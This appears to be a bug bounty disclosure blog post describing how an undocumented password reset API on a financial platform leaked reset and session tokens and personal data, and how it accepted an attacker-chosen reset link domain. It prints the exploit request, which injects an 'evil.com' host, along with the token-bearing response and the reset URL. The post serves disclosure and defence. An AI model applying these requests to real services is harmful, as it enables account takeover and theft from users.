---
title: "The Undocumented Password Reset That Exposed 1.3M Users and Resulted in Account Takeovers"
layout: post
---

Password reset flows are supposed to be the last safety net for users. Done right, they help recover access securely. Done wrong, they can hand over full control of accounts to attackers.  

During a bug bounty season, we came across a case where this exact flaw existed. What started as an undocumented endpoint quickly escalated into **three different account takeover scenarios**, all within one of the world’s most popular financial platforms.

## An Undocumented Functionality

The first clue didn’t come from the user interface, but from the **JavaScript files** exposed by the application.  
While reviewing them, we identified references to a password reset endpoint that was **not documented nor used by the frontend**.  

The platform had a separate, legitimate resource for handling password resets. Yet, hidden in the code, there was this forgotten API, still alive and still callable in production.  

By reverse-engineering the request parameters from the JS, we managed to reconstruct the hidden call. What followed was alarming.

## The First Red Flag

Testing this undocumented endpoint revealed something no one would expect from a password reset function.  
Instead of simply confirming *“reset email sent”*, the API returned a **JSON payload overflowing with sensitive information**:  

- Full name  
- Email address  
- Phone numbers  
- Home address
- Account balances
- More account information
- And most critically, the **password reset token** and **user session token**!

## The Exploit in Action

To confirm the impact, we registered two accounts,  one attacker and one victim.  
The attacker logged in, grabbed their session token, and then used it to craft a reset request for the victim’s email.  

Here’s the reconstructed request, pieced together from the hidden JS logic:

- **Request:**

```http
POST /api/public/passwords/ HTTP/2
Host: example.com
Content-Type: application/json
X-User-Token: REDACTED

{
  "reset_password_path": "https://evil.com/",
  "email": "victim@gmail.com"
}
```

- **Response:**

```json
HTTP/2 201 Created

{
  "pin": "204792",
  "id": 912453,
  "name": "test test",
  "email": "victim@gmail.com",
  "phoneNumber": "+346546xxx91",
  "phoneNumberNormalized": "+346546xxx91",
  "formattedPhoneNumber": "+34 654 6xx x91",
  "balanceCents": 0,
  "authenticationToken": "o5XA6_....L14ENqEp",
  "jobId": "b7880eb5-d2be-4277-bd05-ec27c4e3aac7"
  [...]
},
  "https://evil.com/",
  "dc9483f94a319....acdabe75cf5e334"
```

The following image shows the response from the undocumented API, which exposes sensitive user information along with the password reset token.

<img width="986" height="495" alt="API Response" src="https://github.com/user-attachments/assets/39c86619-1699-46d8-9b77-c18539530da3" />

### From Token to Takeover

With the token in hand, the attacker could directly reset the victim’s password:

```json
https://example.com/reset-password?reset_password_token={Token_here}
```

The following image shows the reset password form using the leaked token.

<img width="1913" height="444" alt="ResetPasswordForm" src="https://github.com/user-attachments/assets/baa17728-5391-4d28-8d05-6010e79a3adf" />

The server accepted it, allowed the password update, and granted full control over the victim’s account:

<img width="1253" height="82" alt="SuccessPasswordReset" src="https://github.com/user-attachments/assets/7ff7b270-8a2e-43e8-8264-69b232b26592" />

Logging in as the victim with the new password:

<img width="1319" height="663" alt="LoginNewPassword" src="https://github.com/user-attachments/assets/2538d608-df74-4360-9b2a-9913bbf1d328" />

## The Hidden Second Flaw

The story doesn’t end there.  
The `reset_password_path` parameter, also found in the hidden JS code, was **fully user-controlled**.

That meant the attacker could inject their own domain:

```json
{
   "reset_password_path": "https://evil.com/",
   [...]
}
```

As a result, the **official reset email** sent to the victim pointed to the attacker’s site, delivering the reset token straight into their hands.

Victim receives a password reset email with attacker-controlled domain:

<img width="1464" height="779" alt="ResetLinkManipulation" src="https://github.com/user-attachments/assets/1b7368d7-03ec-4c38-9b37-b0d9c358a6b0" />


### Three Paths to Account Takeover

This single endpoint opened **three independent takeover vectors**:

1. **Password Reset Token Exposure** – Reset tokens leaked in the API response.
2. **Domain Manipulation in Emails** – Victims redirected to attacker-controlled sites, exposing tokens.
3. **Session Token Leakage** – Active user session tokens leaked directly, allowing instant access without changing the password.
One endpoint. Three account takeovers and massive PII leak affecting more than 1,3 million users.

## Why This Was So Critical

This wasn’t just any application.  
It was a **globally recognized financial platform**, handling deposits, balances, and withdrawals.

An attacker exploiting this could:
- Log directly into user accounts using leaked **session tokens**
- Change passwords and lock out legitimate users
- **Withdraw funds to attacker-controlled bank accounts**

The potential financial impact? **Millions of dollars in direct losses**, on top of reputational damage and user trust collapse.

## Lessons Learned

This case highlights several important lessons:

- **Hidden endpoints are still endpoints.** Attackers will find them.
- Password reset tokens should never appear in API responses.
- Recovery flows must be tightly bound to specific users and validated server-side.
- Parameters that control email content or links must be whitelisted, not user-defined.
- Systems handling **financial transactions** require extra layers of protection, audits, and monitoring.

## Timeline & Bounty

- **March 2, 2024** – Vulnerability discovered during testing  
- **March 3, 2024** – Initial report submitted to the program  
- **March 6, 2024** – Triaged by the security team
- **March 10, 2024** – Vulnerability confirmed and marked as critical  
- **May 2, 2024** – Fix deployed by the engineering team  
- **May 7, 2024** – **Reward:** **$3,000 bounty** awarded for the report  

<img width="278" height="617" alt="BountyReward" src="https://github.com/user-attachments/assets/99fc7e64-e794-44cf-ad6f-8c45a9a7e87a" />
